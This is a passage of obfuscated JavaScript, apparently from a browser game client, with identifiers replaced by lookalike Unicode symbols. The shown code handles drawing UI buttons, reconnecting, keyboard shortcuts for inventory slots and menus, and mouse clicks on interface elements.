				if (this.ᐃᐃΔⵠⵠⵠⲆ) {
					ᐃΔⲆⲆΔⲆⲆⵠⵠ();
					this.ⵠᐃΔᐃⵠⵠⵠ === ΔⲆᐃᐃ && this.ΔΔΔΔ.button.ΔᐃΔⵠ(Δ);
					if (ⲆⲆⲆ.mode !== ΔᐃᐃΔ.ⵠᐃᐃⲆᐃ && ⲆⲆⲆ.mode !== ΔᐃᐃΔ.ⲆⲆⵠⵠⲆ && ΔᐃᐃΔ.ⲆⵠⲆⵠᐃⲆΔ !== ⲆⲆⲆ.mode && this.ᐃΔΔΔⵠᐃⲆ === 1) this.ᐃⲆᐃⲆ.button.ΔᐃΔⵠ(Δ);
					this.options.button.ΔᐃΔⵠ(Δ);
					this.ⲆⲆⲆΔⲆᐃⲆ === ΔⲆⵠ && this.ⲆⵠⵠⲆᐃ.button.ΔᐃΔⵠ(Δ);
					ⲆⲆⵠⲆ.ⲆΔΔᐃⵠ ? this.ⲆⲆⵠⲆ.ⲆΔΔⲆⵠᐃⲆ.ΔᐃΔⵠ(Δ) : this.ⲆⲆⵠⲆ.ΔᐃᐃⲆᐃᐃᐃ.ΔᐃΔⵠ(Δ);
					ᐃⵠⵠⲆⵠⲆΔΔᐃ();
					ᐃᐃΔᐃⲆⵠⲆᐃⲆ();
					this.ⲆΔⲆⵠ.ΔᐃΔⵠ();
					ⲆⲆⵠⵠⲆⲆᐃᐃⲆ();
					ΔⲆᐃΔΔⲆΔⲆᐃ();
					ΔⲆⵠⲆᐃᐃⵠᐃᐃ();
					ᐃᐃⵠΔⲆᐃⲆⲆΔ();
					ΔⵠᐃᐃᐃⲆᐃΔⲆ();
					ᐃⲆΔΔΔⲆΔⲆⲆ();
					ΔⵠΔⵠⵠᐃⵠⵠΔ();
					ᐃⲆⵠⵠΔᐃⲆⲆΔ();
					ⲆᐃⵠᐃᐃΔⵠⵠⲆ();
					ⲆⵠⲆᐃᐃⲆΔⲆΔ();
					ᐃΔΔᐃΔᐃⲆⵠᐃ();
					ⲆⵠⵠΔᐃⵠⵠΔⲆ();
					ΔᐃᐃⲆⲆⵠⵠ();
					ⲆΔⵠⲆΔΔⵠⵠᐃ()
				}
				if (ᐃᐃΔ.Ⲇⵠⵠⵠᐃ.enabled) ΔᐃΔᐃᐃⵠⵠⲆᐃ();
				ⵠⲆΔⲆᐃⲆⵠⲆΔ();
				this.ᐃᐃΔⵠⵠⵠⲆ && this.ΔΔᐃΔⲆΔⵠ === 1 && ᐃⵠᐃΔᐃⵠⲆᐃⵠ();
				ᐃᐃΔ.ⵠΔᐃⲆᐃⲆᐃ.ΔᐃΔⵠ();
				ᐃᐃΔ.alert.ΔᐃΔⵠ(ⵠ[253], ⵠ[481]);
				if (this.ᐃᐃΔⵠⵠⵠⲆ) {
					ᐃᐃΔ.Ⲇⵠⵠⵠᐃ.ΔᐃΔⵠ();
					ᐃᐃΔ.ΔᐃᐃⲆΔ.ΔᐃΔⵠ();
					ᐃᐃΔ.ⲆⵠⲆⵠ.ᐃΔⵠΔᐃᐃΔ.ΔᐃΔⵠ(ⲆⲆⵠⵠ.ⵠΔΔᐃ.x, ⲆⲆⵠⵠ.ⵠΔΔᐃ.y)
				}
				ΔᐃᐃΔⲆΔⵠᐃᐃ()
			};
			this.ΔΔΔⲆᐃⵠⲆⵠΔ = function() {
				ᐃᐃΔ.ⲆΔΔ.ⵠⲆᐃ();
				ᐃᐃΔ.ⲆΔⲆⵠ.ⵠⲆᐃ();
				!ᐃᐃΔ.reconnect.enabled && ᐃᐃΔ.ᐃⵠⵠΔΔ && (ᐃᐃΔ.control.ⵠⲆᐃ(), ᐃᐃΔ.ⵠⲆⵠᐃᐃ.ⵠⲆᐃ());
				ⲆⲆⲆ.ⵠⲆᐃ();
				this.ᐃⲆᐃⲆ.ⲆΔΔⲆΔΔⵠΔⵠ()
			};
			this.ΔⵠⲆⲆⲆΔᐃᐃᐃ = function() {
				ⲆᐃⵠⵠᐃΔⲆΔᐃ()
			};
			this.ΔΔΔⲆΔΔᐃΔⲆ = function() {
				ΔⵠⲆᐃ.ⲆⵠᐃᐃⲆⵠⵠΔᐃ();
				ΔⵠⲆᐃ.ⲆⲆᐃⵠⵠⵠᐃⲆᐃ();
				ΔⵠⲆᐃ.ⵠⵠⲆΔⵠⵠΔΔΔ();
				ΔⵠⲆᐃ.ᐃΔΔΔΔΔᐃⲆΔ()
			};
			this.ΔᐃΔⵠ = function() {
				if (!ᐃᐃΔ.reconnect.enabled && ᐃᐃΔ.ᐃⵠⵠΔΔ) this.ΔΔΔⲆΔΔᐃΔⲆ();
				ⲆⲆⵠⲆ.ΔΔᐃᐃΔΔΔⵠⲆ();
				this.ΔΔΔⲆᐃⵠⲆⵠΔ();
				if (1 === ⵠⲆᐃΔ.ⵠⲆⲆᐃⵠᐃⵠ) {
					var ᐃⵠ = ⲆΔ.ⲆⲆⵠᐃⵠᐃΔ;
					ΔⲆΔⵠ(Δ, ᐃⵠ, Δᐃⵠᐃ - ᐃⵠ.width / ΔⲆᐃⵠᐃ, ᐃΔⵠᐃ - ᐃⵠ.height / ⲆⵠΔⵠ, ᐃⵠ.width / 2, ᐃⵠ.height / 2);
					return
				}
				this.ΔⵠⲆⲆⲆΔᐃᐃᐃ();
				this.ᐃΔΔⲆⵠⲆΔᐃΔ()
			};
			this.ⵠⲆⵠΔΔⵠΔ = function(ΔΔΔⲆ) {
				if (ᐃᐃΔ.ⵠⵠⲆᐃᐃ[ΔᐃⲆⵠⲆⵠΔ[72]] && ΔΔΔⲆ.keyCode === 27) ᐃᐃΔ.ⵠⵠⲆᐃᐃ.ⵠΔΔΔᐃ();
				else if (ᐃᐃΔ.ᐃᐃᐃⲆΔ[ΔᐃⲆⵠⲆⵠΔ[72]] && 27 === ΔΔΔⲆ.keyCode) ᐃᐃΔ.ᐃᐃᐃⲆΔ.ⵠΔΔΔᐃ();
				else if (!ᐃᐃΔ.ⵠⵠⲆᐃᐃ[ΔᐃⲆⵠⲆⵠΔ[72]] && !ᐃᐃΔ.ᐃᐃᐃⲆΔ[ΔᐃⲆⵠⲆⵠΔ[72]] && 79 == ΔΔΔⲆ.keyCode && ᐃΔΔᐃⵠ == -1) ᐃᐃΔ.ᐃᐃᐃⲆΔ.ΔⵠᐃⲆⵠⲆᐃⲆᐃ();
				else if (13 == ΔΔΔⲆ.keyCode && -1 == ᐃΔΔᐃⵠ) {
					ᐃᐃΔ.ᐃᐃᐃⲆΔ[ΔᐃⲆⵠⲆⵠΔ[72]] ? ᐃᐃΔ.ᐃᐃᐃⲆΔ.ΔΔΔⵠⲆᐃⵠ() : ᐃᐃΔ.ⵠⵠⲆᐃᐃ.ⲆΔΔᐃⵠ()
				} else if (!ᐃᐃΔ.ⵠⵠⲆᐃᐃ[ΔᐃⲆⵠⲆⵠΔ[72]] && !ᐃᐃΔ.ᐃᐃᐃⲆΔ[ΔᐃⲆⵠⲆⵠΔ[72]]) {
					if (ΔΔΔⲆ.keyCode === 82) ᐃᐃΔ.ⵠⲆⵠᐃᐃ.ⵠⲆᐃⲆⲆⵠᐃ();
					else if (ΔΔΔⲆ.keyCode === 80 && ΔᐃᐃΔ.ΔⵠⲆᐃⵠΔⵠ === ⲆⲆⲆ.mode && !ᐃᐃΔ.ⲆΔⵠΔⲆⵠⲆ) ᐃᐃΔ.ᐃⵠⲆᐃⵠ.ⵠⲆᐃⲆⲆⵠᐃ();
					else if (49 <= ΔΔΔⲆ.keyCode && 57 >= ΔΔΔⲆ.keyCode) {
						if (ᐃⵠⲆ > ᐃᐃΔ.ⵠΔΔⲆ.id) {
							var ⵠᐃ = ΔΔΔⲆ.keyCode - 49;
							var ⲆⲆᐃᐃ = ᐃᐃΔ.ⲆⵠⲆⵠ.ⵠΔᐃⲆⵠ[ⵠᐃ];
							ⲆⲆᐃᐃ && ΔⵠⲆᐃ.ᐃΔⲆⲆΔ(ⲆⲆᐃᐃ.id, ⵠᐃ)
						}
					} else if (89 == ΔΔΔⲆ.keyCode) ᐃᐃΔ.ⲆⵠᐃⲆⵠᐃⲆ = !ᐃᐃΔ.ⲆⵠᐃⲆⵠᐃⲆ;
					else if (71 == ΔΔΔⲆ.keyCode) ᐃᐃΔ.ⵠΔΔⲆ.ᐃΔⲆⵠⲆⵠᐃᐃΔ()
				}
				ΔⵠⵠΔΔ.up(ΔΔΔⲆ)
			};
			this.ⵠⵠⵠⲆⵠΔᐃ = function(ΔΔΔⲆ) {
				ΔⵠⵠΔΔ.down(ΔΔΔⲆ);
				if (ΔΔΔⲆ.keyCode == ΔᐃᐃⲆᐃ && !ᐃᐃΔ.ⵠⵠⲆᐃᐃ[ΔᐃⲆⵠⲆⵠΔ[72]] && !ᐃᐃΔ.ᐃᐃᐃⲆΔ[ΔᐃⲆⵠⲆⵠΔ[72]]) ΔΔΔⲆ.preventDefault()
			};
			this.ᐃΔΔᐃᐃⵠⲆ = function(ΔΔΔⲆ) {
				ⲆⲆⵠⵠ.ⵠΔΔᐃ = ᐃⵠΔⵠᐃΔⲆ(ᐃᐃᐃ.Ⲇⵠ, ΔΔΔⲆ);
				var ᐃᐃⵠᐃⲆ = ⵠᐃⵠᐃᐃ;
				if (ᐃᐃΔ.ⵠΔΔⲆ.ᐃΔᐃᐃ < ⲆⲆⲆᐃ) ᐃᐃᐃ.ᐃⵠΔⲆⵠ.focus(ⲆⲆⵠⵠ.ⵠΔΔᐃ);
				var ⲆᐃⲆΔ = ᐃᐃΔ.ⲆᐃⲆΔ;
				if (Ⲇᐃᐃᐃ > ᐃᐃΔ.ⵠΔΔⲆ.id && 0 <= ⲆᐃⲆΔ.id) {
					if (!ᐃᐃΔ.ⲆᐃⲆΔ.lock || ᐃᐃΔ.id === ᐃᐃΔ.ⲆᐃⲆΔ.ⲆⵠⵠΔ) ᐃᐃⵠᐃⲆ |= ᐃᐃᐃ.ⵠⵠΔ[ᐃᐃΔ.ⲆᐃⲆΔ.id].ⵠΔⵠⲆ(ᐃᐃᐃ.Ⲇⵠ, ⲆⲆⵠⵠ.ⵠΔΔᐃ, ⵠⲆⵠⵠⵠ)
				}
				var ΔΔΔⵠ = ᐃᐃΔ.ΔΔΔⵠ;
				if (ΔΔΔⵠ[ΔᐃⲆⵠⲆⵠΔ[72]] && 0 < ΔΔΔⵠ.ΔΔΔⲆᐃ) {
					ᐃᐃⵠᐃⲆ |= ᐃᐃᐃ.ⵠΔΔᐃΔⲆᐃ.ⵠΔⵠⲆ(ᐃᐃᐃ.Ⲇⵠ, ⲆⲆⵠⵠ.ⵠΔΔᐃ, ⵠⲆⵠⵠⵠ)
				}
				var ⲆΔΔⲆ = ᐃᐃΔ.ⲆΔΔⲆ;
				ⲆΔΔⲆ[ΔᐃⲆⵠⲆⵠΔ[72]] && ⲆΔΔⲆ.ⵠⵠᐃΔⵠⲆΔ > 0 && (ᐃᐃⵠᐃⲆ |= ᐃᐃᐃ.ΔⵠΔΔᐃᐃΔ.ⵠΔⵠⲆ(ᐃᐃᐃ.Ⲇⵠ, ⲆⲆⵠⵠ.ⵠΔΔᐃ, ⵠⲆⵠⵠⵠ), ᐃᐃⵠᐃⲆ |= ᐃᐃᐃ.ⲆΔⵠᐃⲆᐃⵠ.ⵠΔⵠⲆ(ᐃᐃᐃ.Ⲇⵠ, ⲆⲆⵠⵠ.ⵠΔΔᐃ, ⵠⲆⵠⵠⵠ), ᐃᐃⵠᐃⲆ |= ᐃᐃᐃ.ΔᐃⲆⵠⲆΔᐃ.ⵠΔⵠⲆ(ᐃᐃᐃ.Ⲇⵠ, ⲆⲆⵠⵠ.ⵠΔΔᐃ, ⵠⲆⵠⵠⵠ), ᐃᐃⵠᐃⲆ |= ᐃᐃᐃ.ᐃΔΔᐃⲆⵠⲆ.ⵠΔⵠⲆ(ᐃᐃᐃ.Ⲇⵠ, ⲆⲆⵠⵠ.ⵠΔΔᐃ, ⵠⲆⵠⵠⵠ), ᐃᐃⵠᐃⲆ |= ᐃᐃᐃ.ΔⲆⲆΔⵠⵠⲆ.ⵠΔⵠⲆ(ᐃᐃᐃ.Ⲇⵠ, ⲆⲆⵠⵠ.ⵠΔΔᐃ, ⵠⲆⵠⵠⵠ));
				var ᐃΔᐃΔ = ᐃᐃΔ.ᐃΔᐃΔ;
				ᐃΔᐃΔ[ΔᐃⲆⵠⲆⵠΔ[72]] && ᐃⵠΔ < ᐃΔᐃΔ.ⲆⲆⲆⵠΔΔΔ && (ᐃᐃⵠᐃⲆ |= ᐃᐃᐃ.ⵠΔᐃⵠⵠⲆⲆ.ⵠΔⵠⲆ(ᐃᐃᐃ.Ⲇⵠ, ⲆⲆⵠⵠ.ⵠΔΔᐃ, ⵠⲆⵠⵠⵠ));
				ᐃᐃΔ.sign[ΔᐃⲆⵠⲆⵠΔ[72]] && (ᐃᐃⵠᐃⲆ |= ᐃᐃᐃ.sign.button.ⵠΔⵠⲆ(ᐃᐃᐃ.Ⲇⵠ, ⲆⲆⵠⵠ.ⵠΔΔᐃ, ⵠⲆⵠⵠⵠ));
				if (!ᐃᐃΔ.ⲆᐃⲆΔ.lock) {
					if (ᐃᐃΔ.ⲆᐃⲆΔ.ⵠᐃⵠᐃⵠᐃⵠ) ᐃᐃⵠᐃⲆ |= ᐃᐃᐃ.ⵠᐃⵠΔᐃⵠⲆ.ⵠΔⵠⲆ(ᐃᐃᐃ.Ⲇⵠ, ⲆⲆⵠⵠ.ⵠΔΔᐃ, ⵠⲆⵠⵠⵠ)
				}
				if (ᐃᐃΔ.ⲆᐃⲆΔ.ΔᐃⲆⲆⵠⲆΔ) ᐃᐃⵠᐃⲆ |= ᐃᐃᐃ.ⲆⲆⲆⵠᐃΔΔ.ⵠΔⵠⲆ(ᐃᐃᐃ.Ⲇⵠ, ⲆⲆⵠⵠ.ⵠΔΔᐃ, ⵠⲆⵠⵠⵠ);
				if (0 > ᐃᐃΔ.ⵠΔΔⲆ.id && !ᐃᐃᐃ.ΔΔΔΔ[ΔᐃⲆⵠⲆⵠΔ[72]] && !ᐃᐃᐃ.ⵠⵠᐃᐃ[ΔᐃⲆⵠⲆⵠΔ[72]] && !ᐃᐃᐃ.ⵠΔⵠⲆⵠ[ΔᐃⲆⵠⲆⵠΔ[72]] && !ᐃᐃᐃ.ᐃⲆᐃⲆ[ΔᐃⲆⵠⲆⵠΔ[72]] && !ᐃᐃᐃ.options[ΔᐃⲆⵠⲆⵠΔ[72]] && !ᐃᐃᐃ.ⲆⵠⵠⲆᐃ[ΔᐃⲆⵠⲆⵠΔ[72]]) {
					var Ⲇⵠⵠ = ᐃᐃΔ.ⲆⵠⲆⵠ.ⵠΔᐃⲆⵠ;
					for (var ⵠᐃ = ΔᐃΔΔ; ⵠᐃ < Ⲇⵠⵠ.length; ⵠᐃ++) {
						var ΔΔᐃΔⵠ = Ⲇⵠⵠ[ⵠᐃ].ⵠΔⵠⲆ(ᐃᐃᐃ.Ⲇⵠ, ⲆⲆⵠⵠ.ⵠΔΔᐃ, ⵠⲆⵠⵠⵠ);
						ᐃᐃⵠᐃⲆ |= ΔΔᐃΔⵠ;
						ΔΔᐃΔⵠ && ᐃᐃΔ.ⲆⵠⲆⵠ.ᐃΔⵠΔᐃᐃΔ.start(ⵠᐃ, ⲆⲆⵠⵠ.ⵠΔΔᐃ);
						if (ⲆᐃⲆΔ[ΔᐃⲆⵠⲆⵠΔ[72]] && (ⲆᐃⲆΔ.id < 0 || ⲆᐃⲆΔ.id == Ⲇⵠⵠ[ⵠᐃ].id) || ᐃᐃΔ.ΔⲆᐃⲆⵠ[ΔᐃⲆⵠⲆⵠΔ[72]] && Ⲇⵠⵠ[ⵠᐃ].id === ᐃᐃ.ⵠⲆⲆᐃ || ᐃᐃΔ.Ⲇⵠⵠⵠⵠ[ΔᐃⲆⵠⲆⵠΔ[72]] && ᐃᐃ.ΔⵠⵠⵠΔ === Ⲇⵠⵠ[ⵠᐃ].id || ᐃᐃΔ.ᐃΔᐃΔ[ΔᐃⲆⵠⲆⵠΔ[72]] && (Ⲇⵠⵠ[ⵠᐃ].id === ᐃᐃ.ⵠⲆⲆᐃ || ᐃᐃ.ⵠᐃⲆⵠᐃ === Ⲇⵠⵠ[ⵠᐃ].id) || ᐃᐃΔ.ΔΔΔⵠ[ΔᐃⲆⵠⲆⵠΔ[72]] && Ⲇⵠⵠ[ⵠᐃ].id === ᐃᐃ.ⵠⲆⲆⲆⵠ || ᐃᐃΔ.ⲆΔΔⲆ[ΔᐃⲆⵠⲆⵠΔ[72]] && Ⲇⵠⵠ[ⵠᐃ].id === ᐃᐃ.ⵠⲆⲆᐃ) {
							ᐃᐃⵠᐃⲆ |= ᐃᐃᐃ.ΔΔᐃⵠⲆ[Ⲇⵠⵠ[ⵠᐃ].id].ⵠΔⵠⲆ(ᐃᐃᐃ.Ⲇⵠ, ⲆⲆⵠⵠ.ⵠΔΔᐃ, ⵠⲆⵠⵠⵠ)
						}
					}
				}
				ᐃᐃΔ.ⵠᐃΔΔⲆ[ΔᐃⲆⵠⲆⵠΔ[72]] && (ᐃᐃⵠᐃⲆ |= ᐃᐃᐃ.ⵠᐃΔΔⲆ.ⵠΔⵠⲆ(ᐃᐃᐃ.Ⲇⵠ, ⲆⲆⵠⵠ.ⵠΔΔᐃ, ⵠⲆⵠⵠⵠ));
				if (ᐃᐃᐃ.ΔΔⲆᐃⲆ != -ⵠΔⲆ) {
					ᐃᐃⵠᐃⲆ |= ᐃᐃᐃ.ᐃΔⵠΔᐃ[ᐃᐃᐃ.ΔΔⲆᐃⲆ].button.ⵠΔⵠⲆ(ᐃᐃᐃ.Ⲇⵠ, ⲆⲆⵠⵠ.ⵠΔΔᐃ, ⵠⲆⵠⵠⵠ);
					if (ᐃᐃⵠᐃⲆ) var ΔⵠᐃⵠᐃΔΔ = ᐃᐃⲆᐃᐃ
				} else var ΔⵠᐃⵠᐃΔΔ = false;
				if (ᐃᐃΔ.ⵠΔΔⲆ.id < 0 && ᐃᐃΔ.ⵠΔΔⲆ.ᐃΔᐃᐃ < Ⲇᐃᐃᐃ && !ΔⵠᐃⵠᐃΔΔ && !ᐃᐃᐃ.ΔΔΔΔ[ΔᐃⲆⵠⲆⵠΔ[72]] && !ᐃᐃᐃ.ⵠⵠᐃᐃ[ΔᐃⲆⵠⲆⵠΔ[72]] && !ᐃᐃᐃ.options[ΔᐃⲆⵠⲆⵠΔ[72]] && !ᐃᐃᐃ.ⵠΔⵠⲆⵠ[ΔᐃⲆⵠⲆⵠΔ[72]] && !ᐃᐃᐃ.ⲆⵠⵠⲆᐃ[ΔᐃⲆⵠⲆⵠΔ[72]] && !ᐃᐃΔ.ⵠⵠⲆⵠⵠ) {
					var Ⲇⵠⵠ = ᐃᐃΔ.ⵠΔΔⲆ.ⵠⵠᐃΔᐃ;
					for (var ⵠᐃ = Δⵠᐃ; ⵠᐃ < Ⲇⵠⵠ.length; ⵠᐃ++) {
						ᐃᐃⵠᐃⲆ |= Ⲇⵠⵠ[ⵠᐃ].ⵠΔⵠⲆ(ᐃᐃᐃ.Ⲇⵠ, ⲆⲆⵠⵠ.ⵠΔΔᐃ, ⵠⲆⵠⵠⵠ)
					}
				}
				0 > ᐃᐃΔ.ⵠΔΔⲆ.id && ΔⲆⲆ > ᐃᐃΔ.ⵠΔΔⲆ.ᐃΔᐃᐃ && ᐃᐃΔ.ΔᐃᐃⲆΔ[ΔᐃⲆⵠⲆⵠΔ[72]] && !ᐃᐃᐃ.ΔΔΔΔ[ΔᐃⲆⵠⲆⵠΔ[72]] && !ᐃᐃᐃ.ⵠⵠᐃᐃ[ΔᐃⲆⵠⲆⵠΔ[72]] && !ᐃᐃᐃ.options[ΔᐃⲆⵠⲆⵠΔ[72]] && !ᐃᐃᐃ.ⵠΔⵠⲆⵠ[ΔᐃⲆⵠⲆⵠΔ[72]] && !ᐃᐃᐃ.ᐃⲆᐃⲆ[ΔᐃⲆⵠⲆⵠΔ[72]] && !ᐃᐃᐃ.ⲆⵠⵠⲆᐃ[ΔᐃⲆⵠⲆⵠΔ[72]] && (ᐃᐃⵠᐃⲆ |= ᐃᐃᐃ.ΔᐃᐃⲆΔ.button.ⵠΔⵠⲆ(ᐃᐃᐃ.Ⲇⵠ, ⲆⲆⵠⵠ.ⵠΔΔᐃ, ⵠⲆⵠⵠⵠ));
				ᐃᐃΔ.ⵠΔΔⲆ.ᐃΔᐃᐃ < ᐃⵠⲆ && !ᐃᐃᐃ.ⵠⵠᐃᐃ[ΔᐃⲆⵠⲆⵠΔ[72]] && !ᐃᐃᐃ.options[ΔᐃⲆⵠⲆⵠΔ[72]] && !ᐃᐃᐃ.ⵠΔⵠⲆⵠ[ΔᐃⲆⵠⲆⵠΔ[72]] && !ᐃᐃᐃ.ᐃⲆᐃⲆ[ΔᐃⲆⵠⲆⵠΔ[72]] && !ᐃᐃᐃ.ⲆⵠⵠⲆᐃ[ΔᐃⲆⵠⲆⵠΔ[72]] && (ᐃᐃⵠᐃⲆ |= ᐃᐃᐃ.ΔΔΔΔ.button.ⵠΔⵠⲆ(ᐃᐃᐃ.Ⲇⵠ, ⲆⲆⵠⵠ.ⵠΔΔᐃ, ⵠⲆⵠⵠⵠ));
				if (ᐃᐃΔ.ⵠΔΔⲆ.ᐃΔᐃᐃ < 0 && !ᐃᐃᐃ.ΔΔΔΔ[ΔᐃⲆⵠⲆⵠΔ[72]] && !ᐃᐃᐃ.ⵠⵠᐃᐃ[ΔᐃⲆⵠⲆⵠΔ[72]] && !ᐃᐃᐃ.ⵠΔⵠⲆⵠ[ΔᐃⲆⵠⲆⵠΔ[72]] && !ᐃᐃᐃ.ᐃⲆᐃⲆ[ΔᐃⲆⵠⲆⵠΔ[72]] && !ᐃᐃᐃ.ⲆⵠⵠⲆᐃ[ΔᐃⲆⵠⲆⵠΔ[72]]) ᐃᐃⵠᐃⲆ |= ᐃᐃᐃ.options.button.ⵠΔⵠⲆ(ᐃᐃᐃ.Ⲇⵠ, ⲆⲆⵠⵠ.ⵠΔΔᐃ, ⵠⲆⵠⵠⵠ);
				if (ᐃᐃΔ.ⵠΔΔⲆ.ᐃΔᐃᐃ < ᐃⵠⲆⵠ && !ᐃᐃᐃ.ΔΔΔΔ[ΔᐃⲆⵠⲆⵠΔ[72]] && !ᐃᐃᐃ.ⵠⵠᐃᐃ[ΔᐃⲆⵠⲆⵠΔ[72]] && !ᐃᐃᐃ.ⵠΔⵠⲆⵠ[ΔᐃⲆⵠⲆⵠΔ[72]] && !ᐃᐃᐃ.ᐃⲆᐃⲆ[ΔᐃⲆⵠⲆⵠΔ[72]] && !ᐃᐃᐃ.options[ΔᐃⲆⵠⲆⵠΔ[72]]) ᐃᐃⵠᐃⲆ |= ᐃᐃᐃ.ⲆⵠⵠⲆᐃ.button.ⵠΔⵠⲆ(ᐃᐃᐃ.Ⲇⵠ, ⲆⲆⵠⵠ.ⵠΔΔᐃ, ⵠⲆⵠⵠⵠ);
				if (ᐃᐃΔ.ⵠΔΔⲆ.ᐃΔᐃᐃ < 0 && !ᐃᐃᐃ.ΔΔΔΔ[ΔᐃⲆⵠⲆⵠΔ[72]] && !ᐃᐃᐃ.ⵠⵠᐃᐃ[ΔᐃⲆⵠⲆⵠΔ[72]] && !ᐃᐃᐃ.ⵠΔⵠⲆⵠ[ΔᐃⲆⵠⲆⵠΔ[72]] && !ᐃᐃᐃ.ᐃⲆᐃⲆ[ΔᐃⲆⵠⲆⵠΔ[72]] && !ᐃᐃᐃ.options[ΔᐃⲆⵠⲆⵠΔ[72]] && !ᐃᐃᐃ.ⲆⵠⵠⲆᐃ[ΔᐃⲆⵠⲆⵠΔ[72]]) {
					ⲆⲆⵠⲆ.ⲆΔΔᐃⵠ ? ᐃᐃⵠᐃⲆ |= ᐃᐃᐃ.ⲆⲆⵠⲆ.ⲆΔΔⲆⵠᐃⲆ.ⵠΔⵠⲆ(ᐃᐃᐃ.Ⲇⵠ, ⲆⲆⵠⵠ.ⵠΔΔᐃ, ⵠⲆⵠⵠⵠ) : ᐃᐃⵠᐃⲆ |= ᐃᐃᐃ.ⲆⲆⵠⲆ.ΔᐃᐃⲆᐃᐃᐃ.ⵠΔⵠⲆ(ᐃᐃᐃ.Ⲇⵠ, ⲆⲆⵠⵠ.ⵠΔΔᐃ, ⵠⲆⵠⵠⵠ)
				}
				if (ᐃᐃΔ.ⵠΔΔⲆ.ᐃΔᐃᐃ < ΔⲆⵠⲆ && !ᐃᐃᐃ.ΔΔΔΔ[ΔᐃⲆⵠⲆⵠΔ[72]] && !ᐃᐃᐃ.ⲆⵠⵠⲆᐃ[ΔᐃⲆⵠⲆⵠΔ[72]] && !ᐃᐃᐃ.ⵠⵠᐃᐃ[ΔᐃⲆⵠⲆⵠΔ[72]] && !ᐃᐃᐃ.options[ΔᐃⲆⵠⲆⵠΔ[72]] && !ᐃᐃᐃ.ⵠΔⵠⲆⵠ[ΔᐃⲆⵠⲆⵠΔ[72]] && ⲆⲆⲆ.mode !== ΔᐃᐃΔ.ⵠᐃᐃⲆᐃ && ⲆⲆⲆ.mode !== ΔᐃᐃΔ.ⲆⲆⵠⵠⲆ && ⲆⲆⲆ.mode !== ΔᐃᐃΔ.ⲆⵠⲆⵠᐃⲆΔ) ᐃᐃⵠᐃⲆ |= ᐃᐃᐃ.ᐃⲆᐃⲆ.button.ⵠΔⵠⲆ(ᐃᐃᐃ.Ⲇⵠ, ⲆⲆⵠⵠ.ⵠΔΔᐃ, ⵠⲆⵠⵠⵠ);
				if (!ᐃᐃⵠᐃⲆ && !ᐃᐃᐃ.ΔΔΔΔ[ΔᐃⲆⵠⲆⵠΔ[72]] && !ᐃᐃᐃ.ⵠⵠᐃᐃ[ΔᐃⲆⵠⲆⵠΔ[72]] && !ᐃᐃᐃ.options[ΔᐃⲆⵠⲆⵠΔ[72]] && !ᐃᐃᐃ.ⵠΔⵠⲆⵠ[ΔᐃⲆⵠⲆⵠΔ[72]] && !ᐃᐃᐃ.ᐃⲆᐃⲆ[ΔᐃⲆⵠⲆⵠΔ[72]] && !ᐃᐃᐃ.ⲆⵠⵠⲆᐃ[ΔᐃⲆⵠⲆⵠΔ[72]] && !ᐃᐃᐃ.sign[ΔᐃⲆⵠⲆⵠΔ[72]]) {
					if (ᐃᐃΔ.ⵠΔΔⲆ.ᐃΔᐃᐃ >= Δᐃᐃⵠ) ΔⵠⲆᐃ.ⲆᐃᐃᐃⲆᐃΔᐃΔ();
					else if (!ΔⵠᐃⵠᐃΔΔ) ⲆⲆⵠⵠ.down()
				}
			};
			this.ΔⵠⵠᐃᐃᐃΔ = function(ΔΔΔⲆ) {
				ⲆⲆⵠⵠ.ⵠΔΔᐃ = ᐃⵠΔⵠᐃΔⲆ(ᐃᐃᐃ.Ⲇⵠ, ΔΔΔⲆ);
				ⲆⲆⵠⵠ.up();
				if (ᐃᐃΔ.ⲆⵠⲆⵠ.ᐃΔⵠΔᐃᐃΔ.release()) return;
				var ⲆᐃⲆΔ = ᐃᐃΔ.ⲆᐃⲆΔ;
				var ΔⲆᐃⲆⵠ = ᐃᐃΔ.ΔⲆᐃⲆⵠ;
				var Ⲇⵠⵠⵠⵠ = ᐃᐃΔ.Ⲇⵠⵠⵠⵠ;
				var ΔΔΔⵠ = ᐃᐃΔ.ΔΔΔⵠ;
				var ⲆΔΔⲆ = ᐃᐃΔ.ⲆΔΔⲆ;
				var ᐃΔᐃΔ = ᐃᐃΔ.ᐃΔᐃΔ;
				if (ᐃᐃΔ.control.attack) {
					ᐃᐃΔ.control.attack = ⵠⲆⲆ;
					ΔⵠⲆᐃ.ᐃᐃᐃᐃⲆᐃᐃᐃⲆ()
				}
				if (-ᐃᐃⲆΔ != ᐃᐃᐃ.ΔΔⲆᐃⲆ) {
					var ᐃᐃΔⵠ = ᐃᐃᐃ.ᐃΔⵠΔᐃ[ᐃᐃᐃ.ΔΔⲆᐃⲆ].button.ⵠΔⵠⲆ(ᐃᐃᐃ.Ⲇⵠ, ⲆⲆⵠⵠ.ⵠΔΔᐃ, ᐃᐃⵠΔⲆ);
					var ᐃⵠᐃΔ = document[ΔᐃⲆⵠⲆⵠΔ[68]](ⵠ[471]).style;
					if (ᐃᐃΔⵠ && ᐃⵠᐃΔ.display == ⵠ[35]) {
						ᐃⵠᐃΔ.display = ⵠ[465];
						return
					} else if (ᐃᐃΔⵠ) ᐃᐃᐃ.ᐃΔⵠΔᐃ[ᐃᐃᐃ.ΔΔⲆᐃⲆ].action()
				}
				if (0 > ᐃᐃΔ.ⵠΔΔⲆ.id && ⲆΔⵠ <= ⲆᐃⲆΔ.id && !ᐃᐃᐃ.ⵠⵠᐃᐃ[ΔᐃⲆⵠⲆⵠΔ[72]]) {
					if (!ᐃᐃΔ.ⲆᐃⲆΔ.lock || ᐃᐃΔ.ⲆᐃⲆΔ.ⲆⵠⵠΔ === ᐃᐃΔ.id) {
						var ᐃᐃΔⵠ = ᐃᐃᐃ.ⵠⵠΔ[ᐃᐃΔ.ⲆᐃⲆΔ.id].ⵠΔⵠⲆ(ᐃᐃᐃ.Ⲇⵠ, ⲆⲆⵠⵠ.ⵠΔΔᐃ, ᐃᐃⵠΔⲆ);
						if (ᐃᐃΔⵠ) ΔⵠⲆᐃ.ⲆⵠⵠΔΔⵠⵠⲆΔ(ⲆᐃⲆΔ)
					}
				}
				var ΔΔΔⵠ = ᐃᐃΔ.ΔΔΔⵠ;
				if (ΔΔΔⵠ[ΔᐃⲆⵠⲆⵠΔ[72]] && 0 < ΔΔΔⵠ.ΔΔΔⲆᐃ && !ᐃᐃᐃ.ⵠⵠᐃᐃ[ΔᐃⲆⵠⲆⵠΔ[72]]) {
